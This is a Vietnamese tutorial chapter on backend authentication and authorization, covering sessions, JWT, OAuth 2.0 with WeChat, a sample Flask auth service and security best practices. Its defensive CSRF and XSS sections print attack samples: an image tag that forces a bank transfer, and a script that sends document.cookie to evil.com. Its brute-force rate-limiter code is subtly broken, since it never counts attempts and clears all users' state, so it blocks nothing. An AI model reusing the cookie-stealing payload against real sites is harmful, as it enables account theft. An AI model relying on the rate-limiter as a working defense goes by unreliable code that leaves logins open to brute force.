# Hệ thống xác thực và ủy quyền
> 💡 **Hướng dẫn học tập**: Chương này sẽ giúp bạn hiểu sâu về "hệ thống kiểm soát ra vào" của hệ thống backend -- xác thực và ủy quyền. Chúng ta sẽ bắt đầu từ khái niệm cơ bản nhất "bạn là ai", từng bước nắm vững các giải pháp xác thực hiện đại như Session, JWT, OAuth 2.0.

<AuthEvolutionDemo />

## 0. Dẫn nhập: "hệ thống kiểm soát ra vào" của hệ thống

Bạn đăng nhập WeChat xong, tại sao tắt đi mở lại vẫn đang đăng nhập?
Bạn truy cập Bilibili, tại sao biết bạn là hội viên VIP hay người dùng thường?
Bạn dùng WeChat quét mã đăng nhập trang web bên thứ ba, tại sao không cần nhập mật khẩu?

Đằng sau tất cả đều có một hệ thống cốt lõi: **Xác thực và Ủy quyền (Authentication & Authorization)**.

Nếu ví hệ thống backend như một tòa nhà:

- **Xác thực (Authentication)**: xác nhận "bạn là ai" (xác minh chứng minh thư/thẻ ra vào).
- **Ủy quyền (Authorization)**: xác nhận "bạn có thể đi đâu" (VIP được vào phòng VIP, người dùng thường thì không).

### 0.1 Tại sao cần xác thực?

Chỉ có một lý do: **bảo vệ tài nguyên**.

- **Bảo vệ quyền riêng tư**: thông tin cá nhân, lịch sử chat của bạn, chỉ bạn mới xem được.
- **Kiểm soát quyền**: admin có thể xóa người dùng, người dùng thường thì không.
- **Ngăn chặn lạm dụng**: ngăn chặn gọi API độc hại, spam.

<AuthBasicsDemo />

### 0.2 Demo tương tác: quy trình đăng nhập

Hãy cùng trải nghiệm một demo đăng nhập thực tế để hiểu cách xác thực và ủy quyền hoạt động.

<AuthInteractiveLoginDemo />

**Điểm then chốt**: xác thực là tuyến phòng thủ đầu tiên, mọi thao tác nhạy cảm đều phải xác minh danh tính trước.

---

## 1. Khái niệm cơ bản: Xác thực vs Ủy quyền

### 1.1 Xác thực (Authentication): bạn là ai?

Xác nhận danh tính của người dùng.

- _Ví dụ_: nhập username password, quét vân tay, nhận diện khuôn mặt.
- _Đầu ra_: một Token đại diện cho "bạn".
- _Tên viết tắt_: **AuthN**

### 1.2 Ủy quyền (Authorization): bạn có thể làm gì?

Xác nhận người dùng có những quyền gì.

- _Ví dụ_: admin có thể xóa bài viết, người dùng thường chỉ có thể like.
- _Đầu ra_: cho phép hoặc từ chối truy cập.
- _Tên viết tắt_: **AuthZ**

### 1.3 Mối quan hệ giữa hai khái niệm

```
Yêu cầu người dùng -> Xác thực (bạn là ai?) -> Ủy quyền (bạn có thể làm không?) -> Thực thi logic nghiệp vụ
                     |                        |
                Xác minh danh tính       Kiểm tra quyền
                (Token hợp lệ?)          (Có quyền delete không?)
```

<AuthNvsAuthZDemo />

**Điểm then chốt**: xác thực trước, ủy quyền sau. Chỉ khi xác nhận được "bạn là ai", mới có thể đánh giá "bạn có thể làm gì".

---

## 2. Lịch sử tiến hóa giải pháp

### 2.1 Thế hệ thứ nhất: HTTP Basic Authentication

Giải pháp cổ xưa nhất, đặt trực tiếp username password vào HTTP header.

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **Ưu điểm**: đơn giản, mọi trình duyệt đều hỗ trợ.
- **Nhược điểm**:
  - Không an toàn (Base64 có thể giải mã, tương đương plain text).
  - Mỗi request đều phải gửi mật khẩu (dễ bị chặn bắt).
  - Không thể chủ động đăng xuất (trừ khi đóng trình duyệt).

**Kết luận**: chỉ phù hợp cho công cụ test nội bộ, tuyệt đối không dùng cho môi trường production.

### 2.2 Thế hệ thứ hai: Session + Cookie

Giải pháp kinh điển của phát triển Web.

**Quy trình**:

```
1. Người dùng đăng nhập (POST /login)
   -> Server xác minh username password
   -> Tạo Session (trong bộ nhớ server hoặc Redis)
   -> Trả về Set-Cookie: session_id=abc123

2. Các request tiếp theo
   -> Trình duyệt tự động gửi kèm Cookie: session_id=abc123
   -> Server dựa vào session_id tìm Session
   -> Tìm thấy thì coi là "bạn là bạn"
```

**Ví dụ code**:

```python
# Backend (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # Xác minh username password
    user = db.authenticate(username, password)
    if user:
        # Tạo Session
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "Sai username hoặc mật khẩu"}, 401

@app.route("/api/admin/users")
def get_users():
    # Kiểm tra Session
    if "user_id" not in session:
        return {"error": "Chưa đăng nhập"}, 401

    # Kiểm tra quyền
    if session.get("role") != "admin":
        return {"error": "Không đủ quyền"}, 403

    # Thực thi logic nghiệp vụ
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**Ưu điểm**:

- Đơn giản trực quan, dễ hiểu.
- Server có thể chủ động đăng xuất (xóa Session).

**Nhược điểm**:

- **Server có trạng thái**: cần lưu Session, nhiều server cần chia sẻ (như Redis).
- **Khó cross-domain**: Cookie mặc định không thể cross-domain (vấn đề CORS).
- **Tấn công CSRF**: trang web độc hại có thể mạo danh Cookie của bạn.

**Kết luận**: phù hợp cho ứng dụng Web truyền thống (server-side rendering), không phù hợp cho mobile và SPA hiện đại.

### 2.3 Thế hệ thứ ba: Token (JWT)

Giải pháp chủ đạo của Web hiện đại.

**Tư tưởng cốt lõi**: không lưu trạng thái ở server, mã hóa thông tin người dùng thành Token, đặt ở client.

**Cấu trúc JWT**:

```
JWT = Header.Payload.Signature

Ví dụ:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **Header**: thông tin thuật toán (như `{"alg": "HS256", "typ": "JWT"}`).
- **Payload**: thông tin người dùng (như `{"user_id": 123, "role": "admin", "exp": 1616239022}`).
- **Signature**: chữ ký (chống giả mạo).

**Quy trình**:

```python
# 1. Người dùng đăng nhập
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # Tạo JWT
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # Hết hạn sau 24 giờ
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "Sai username hoặc mật khẩu"}, 401

# 2. Các request tiếp theo
@app.route("/api/admin/users")
def get_users():
    # Lấy Token từ Header
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "Không cung cấp Token"}, 401

    token = auth_header.split(" ")[1]

    try:
        # Xác minh và parse Token
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "Token đã hết hạn"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Token không hợp lệ"}, 401

    # Kiểm tra quyền
    if payload.get("role") != "admin":
        return {"error": "Không đủ quyền"}, 403

    # Thực thi logic nghiệp vụ
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**Ưu điểm**:

- **Stateless**: server không lưu Session, dễ scale ngang.
- **Thân thiện cross-domain**: đặt trong Header, không bị giới hạn cross-domain của Cookie.
- **Thân thiện mobile**: native App cũng dễ dàng sử dụng.
- **Thông tin phong phú**: Payload có thể lưu thông tin người dùng, quyền hạn.

**Nhược điểm**:

- **Không thể chủ động đăng xuất**: Token một khi đã phát hành, trước khi hết hạn vẫn có hiệu lực (trừ khi dùng blacklist).
- **Payload có thể đọc**: mã hóa Base64, không thể lưu thông tin nhạy cảm (như mật khẩu).
- **Token quá lớn**: mỗi request đều phải gửi kèm, vài trăm byte.

**Kết luận**: giải pháp tiêu chuẩn cho Web và mobile hiện đại.

<SessionVsJWTDemo />

---

## 3. OAuth 2.0: đăng nhập bên thứ ba

Bạn chắc chắn đã thấy nút này: "Đăng nhập bằng WeChat", "Đăng nhập bằng Google".

Đây chính là **OAuth 2.0**: một framework **ủy quyền** (không phải xác thực!).

### 3.1 Các vai trò cốt lõi

| Vai trò                    | Giải thích                    | Ví dụ               |
| :------------------------- | :---------------------------- | :------------------ |
| **Resource Owner**         | Chủ sở hữu tài nguyên (người dùng) | Bạn                 |
| **Client**                 | Ứng dụng bên thứ ba           | Một trang web nào đó |
| **Authorization Server**   | Server ủy quyền               | WeChat, Google      |
| **Resource Server**        | Server tài nguyên             | API thông tin người dùng của WeChat |

### 3.2 Chế độ Authorization Code (Authorization Code Flow)

Chế độ an toàn nhất, phù hợp cho server có backend.

**Quy trình**:

```
1. Người dùng nhấn "Đăng nhập bằng WeChat"
   -> Chuyển hướng đến trang ủy quyền WeChat
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. Người dùng quét mã và đồng ý ủy quyền
   -> WeChat chuyển hướng về trang web của bạn
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. Backend của bạn dùng code để đổi lấy access_token
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   -> Trả về: { "access_token": "...", "openid": "..." }

4. Dùng access_token lấy thông tin người dùng
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   -> Trả về: { "nickname": "张三", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**Ví dụ code**:

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. Chuyển hướng đến trang ủy quyền WeChat
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. Lấy code
    code = request.args.get("code")
    state = request.args.get("state")

    # Xác minh state (chống CSRF)
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. Dùng code đổi access_token
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. Lấy thông tin người dùng
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. Tạo hoặc cập nhật người dùng cục bộ
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. Tạo JWT của hệ thống
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**Điểm then chốt**:

- **code chỉ dùng được một lần**: dùng xong là hết hiệu lực, chống chặn bắt.
- **state chống CSRF**: tạo chuỗi ngẫu nhiên, xác minh khi callback, chống trang web độc hại giả mạo.
- **redirect_uri phải khớp**: đăng ký trước trên nền tảng WeChat, chống tấn công chuyển hướng.

### 3.3 Các chế độ khác

| Chế độ                              | Tình huống áp dụng                | Mức độ an toàn    |
| :---------------------------------- | :-------------------------------- | :---------------- |
| **Authorization Code**              | Server có backend                 | ⭐⭐⭐⭐⭐         |
| **Implicit**                        | Ứng dụng pure frontend (SPA)      | ⭐⭐⭐ (không khuyến nghị) |
| **Resource Owner Password**         | Ứng dụng đáng tin cậy cao (như App chính thức) | ⭐⭐              |
| **Client Credentials**              | Giao tiếp server-to-server (không có người dùng) | ⭐⭐⭐⭐          |

<OAuth2ModesDemo />

---

## 4. Thực chiến: thiết kế một hệ thống xác thực hoàn chỉnh

### 4.1 Phân tích yêu cầu

- **Hỗ trợ đa nền tảng**: Web, iOS, Android.
- **Đăng nhập bên thứ ba**: WeChat, Google.
- **Kiểm soát quyền**: người dùng thường, VIP, admin.
- **An toàn**: chống spam, chống chiếm đoạt, chống replay.

### 4.2 Thiết kế kiến trúc

```
┌─────────────┐
│    Client    │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting                │
│  - Token Validation             │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service               │
│  - Đăng ký, đăng nhập           │
│  - Phát hành và xác minh Token  │
│  - Tích hợp OAuth 2.0           │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services             │
│  - User Service                  │
│  - Order Service                 │
│  - Payment Service               │
└─────────────────────────────────┘
```

### 4.3 Thiết kế database

```sql
-- Bảng người dùng
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- bcrypt hash
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- Bảng liên kết đăng nhập bên thứ ba
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- ID người dùng bên thứ ba
    access_token TEXT,  -- lưu mã hóa
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Token blacklist (dùng để chủ động đăng xuất)
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JTI của JWT (định danh duy nhất)
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 Triển khai code

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # Môi trường production dùng biến môi trường

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. Kiểm tra username đã tồn tại chưa
        if db.get_user_by_username(username):
            raise ValueError("Username đã tồn tại")

        # 2. Hash mật khẩu (bcrypt)
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. Tạo người dùng
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. Phát hành Token
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. Truy vấn người dùng
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("Sai username hoặc mật khẩu")

        # 2. Xác minh mật khẩu
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("Sai username hoặc mật khẩu")

        # 3. Phát hành Token
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (ngắn hạn, ví dụ 1 giờ)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # Định danh duy nhất
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (dài hạn, ví dụ 30 ngày)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # Thời gian hết hạn access_token (giây)
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Invalid token type")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("Refresh token đã hết hạn")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh token không hợp lệ")

    def logout(self, token: str):
        # Đưa Token vào blacklist
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # Kiểm tra có trong blacklist không
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("Token đã bị đăng xuất")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Token đã hết hạn")
        except jwt.InvalidTokenError:
            raise ValueError("Token không hợp lệ")

# API decorator
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # Lấy Token từ Header
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "Không cung cấp Token"}, 401

            token = auth_header.split(" ")[1]

            try:
                # Xác minh Token
                payload = auth_service.verify_token(token)
                # Inject thông tin người dùng vào request context
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "Chưa đăng nhập"}, 401

            if request.user["role"] not in roles:
                return {"error": "Không đủ quyền"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# Ví dụ sử dụng
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. Best practice về bảo mật

### 5.1 Lưu trữ mật khẩu

**❌ Cách làm sai**:

```python
# Lưu plain text (tuyệt đối không được!)
db.save_password(username, password)

# Hash MD5 / SHA1 (không đủ an toàn, dễ bị rainbow table phá)
hash = md5(password)
db.save_password(username, hash)
```

**✅ Cách làm đúng**:

```python
# bcrypt (hash thích ứng, hash chậm chống brute force)
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # rounds càng lớn càng an toàn, nhưng cũng càng chậm
)

# Xác minh
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # Mật khẩu đúng
```

**Tại sao dùng bcrypt?**

- **Chậm**: cố tình thiết kế rất chậm (mili giây), chống brute force.
- **Thích ứng**: có thể điều chỉnh rounds, tăng cường khi phần cứng mạnh hơn.
- **Có muối (salt)**: tự động có random salt, chống rainbow table.

<PasswordHashingDemo />

### 5.2 Chống brute force

- **Rate limiting**: cùng một IP / username, 1 phút chỉ được thử 5 lần.
- **CAPTCHA**: thất bại 3 lần thì yêu cầu nhập CAPTCHA.
- **Khóa tài khoản**: thất bại 10 lần thì khóa tài khoản 30 phút.

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """Trả về (số lần thử, thời gian thử đầu tiên)"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # Reset sau 1 phút
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # Vượt quá 5 lần, từ chối
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # Cache lại

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # Kiểm tra rate limit
    if not check_rate_limit(username):
        return {"error": "Thử quá nhiều lần, vui lòng thử lại sau 1 phút"}, 429

    password = request.json["password"]

    # Xác minh mật khẩu
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # Đăng nhập thành công, xóa bộ đếm
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # Đăng nhập thất bại, ghi lại
        record_login_attempt(username)
        return {"error": "Sai username hoặc mật khẩu"}, 401
```

### 5.3 Chống CSRF (Cross-Site Request Forgery)

**Tình huống tấn công**:
Bạn đã đăng nhập vào trang web ngân hàng `bank.com`, sau đó truy cập trang web độc hại `evil.com`. Trong trang `evil.com` có một đoạn code:

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

Trình duyệt của bạn sẽ gửi kèm Cookie của ngân hàng để thực hiện request này (cross-domain request), dẫn đến tiền bị chuyển đi.

**Biện pháp phòng thủ**:

1.  **CSRF Token**:
    - Server-side tạo Token ngẫu nhiên, đặt trong form.
    - Khi submit thì xác minh Token có khớp không.

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # Xác minh CSRF Token
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token không hợp lệ"}, 403

    # Thực hiện chuyển khoản
    ...
```

2.  **SameSite Cookie**:
    - Đặt thuộc tính `SameSite` của Cookie thành `Strict` hoặc `Lax`.

```python
# Flask ví dụ
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # hoặc 'Strict'
    SESSION_COOKIE_SECURE=True      # Chỉ cho phép HTTPS
)
```

3.  **Dùng JWT (không dùng Cookie)**:
    - JWT lưu trong `localStorage`, không tự động gửi kèm, tự nhiên chống CSRF.

<CSRFDefenseDemo />

### 5.4 Chống XSS (Cross-Site Scripting)

**Tình huống tấn công**:
Người dùng độc hại nhập vào phần bình luận:

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

Nếu trang web trực tiếp render nội dung này, Cookie của người dùng khác sẽ bị đánh cắp.

**Biện pháp phòng thủ**:

1.  **Output escaping**:
    - Chuyển `<` thành `&lt;`, `>` thành `&gt;`.

```python
import html

def render_comment(comment):
    # Escape HTML
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **Content Security Policy (CSP)**:
    - Đặt HTTP header, giới hạn nguồn script.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie**:
    - Đặt thuộc tính `HttpOnly` của Cookie, JavaScript không thể đọc.

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefenseDemo />

---

## 6. Tổng kết và lộ trình học tập

Xác thực là "kỹ năng cơ bản" của hệ thống backend, nắm vững nó mới có thể xây dựng ứng dụng an toàn và đáng tin cậy.

### 6.1 Kiến thức cốt lõi

| Kiến thức                  | Mức độ quan trọng | Độ khó | Tần suất thực chiến |
| :------------------------- | :---------------- | :----- | :------------------ |
| **Session + Cookie**       | ⭐⭐⭐⭐          | Trung bình | Cao              |
| **JWT**                    | ⭐⭐⭐⭐⭐        | Thấp   | Rất cao             |
| **OAuth 2.0**              | ⭐⭐⭐⭐          | Cao    | Cao                 |
| **Hash mật khẩu (bcrypt)** | ⭐⭐⭐⭐⭐        | Thấp   | Rất cao             |
| **Rate limit & chống brute force** | ⭐⭐⭐⭐⭐ | Trung bình | Rất cao        |
| **Phòng thủ CSRF**         | ⭐⭐⭐⭐          | Trung bình | Trung bình       |
| **Phòng thủ XSS**          | ⭐⭐⭐⭐          | Thấp   | Cao                 |

### 6.2 Lộ trình học tập

1.  **Nhập môn** (1-2 ngày):
    - Hiểu xác thực vs ủy quyền.
    - Nắm vững nguyên lý Session + Cookie.
    - Triển khai chức năng đăng ký đăng nhập đơn giản.

2.  **Nâng cao** (1 tuần):
    - Học nguyên lý và triển khai JWT.
    - Triển khai hệ thống xác thực dựa trên JWT.
    - Nắm vững hash mật khẩu (bcrypt).

3.  **Thực chiến** (2-4 tuần):
    - Tích hợp OAuth 2.0 (đăng nhập WeChat, Google).
    - Triển khai rate limit, chống brute force.
    - Phòng thủ CSRF, XSS và các tấn công phổ biến.

4.  **Chuyên sâu** (liên tục):
    - Học RBAC (kiểm soát truy cập dựa trên vai trò).
    - Nghiên cứu SSO (Single Sign-On).
    - Khám phá Zero Trust Architecture.

### 6.3 Tài nguyên khuyến nghị

- **Tiêu chuẩn**:
  - RFC 6749 (OAuth 2.0)
  - RFC 7519 (JWT)
- **Bài viết**:
  - JWT.io: https://jwt.io/
  - OAuth 2.0: https://oauth.net/2/
- **Công cụ**:
  - jwt.io (JWT online debug)
  - Postman (API testing)

---

## 7. Bảng tra cứu thuật ngữ (Glossary)

| Thuật ngữ       | Tên đầy đủ                  | Giải thích                                                                                          |
| :-------------- | :-------------------------- | :-------------------------------------------------------------------------------------------------- |
| **AuthN**       | Authentication              | **Xác thực**. Xác nhận "bạn là ai" (như nhập mật khẩu xác minh danh tính).                          |
| **AuthZ**       | Authorization               | **Ủy quyền**. Xác nhận "bạn có thể làm gì" (như admin mới được xóa).                                |
| **Session**     | -                           | **Phiên**. Thông tin trạng thái người dùng được lưu ở server.                                       |
| **Cookie**      | -                           | **Cookie**. Dữ liệu nhỏ được lưu trong trình duyệt, mỗi request đều tự động gửi kèm.                |
| **JWT**         | JSON Web Token              | **JSON Web Token**. Một giải pháp xác thực stateless, gồm ba phần Header, Payload, Signature.        |
| **OAuth 2.0**   | -                           | **Ủy quyền mở**. Framework chuẩn hóa cho đăng nhập bên thứ ba (như "đăng nhập bằng WeChat").        |
| **SSO**         | Single Sign-On              | **Đăng nhập một lần**. Đăng nhập một lần, truy cập được nhiều ứng dụng (như tài khoản Google).       |
| **RBAC**        | Role-Based Access Control   | **Kiểm soát truy cập dựa trên vai trò**. Quyết định quyền dựa trên vai trò của người dùng (như admin, user). |
| **CSRF**        | Cross-Site Request Forgery  | **Giả mạo request cross-site**. Kẻ tấn công dụ người dùng gửi request độc hại (như dùng Cookie của bạn để chuyển tiền). |
| **XSS**         | Cross-Site Scripting        | **Tấn công script cross-site**. Kẻ tấn công chèn script độc hại vào trang web (như đánh cắp Cookie). |
| **bcrypt**      | -                           | **Thuật toán hash mật khẩu**. Một thuật toán hash chậm, chuyên dùng để lưu mật khẩu, chống brute force. |
| **Access Token**  | -                         | **Token truy cập**. Token có hiệu lực ngắn hạn, dùng để truy cập API.                               |
| **Refresh Token** | -                         | **Token làm mới**. Token có hiệu lực dài hạn, dùng để lấy Access Token mới.                         |
| **Scope**       | -                           | **Phạm vi quyền**. Khái niệm trong OAuth 2.0, biểu thị quyền mà ứng dụng bên thứ ba yêu cầu (như đọc thông tin người dùng). |
| **PKCE**        | Proof Key for Code Exchange | **Khóa chứng minh trao đổi authorization code**. Phần mở rộng của OAuth 2.0, dùng để tăng cường bảo mật cho public client (như SPA). |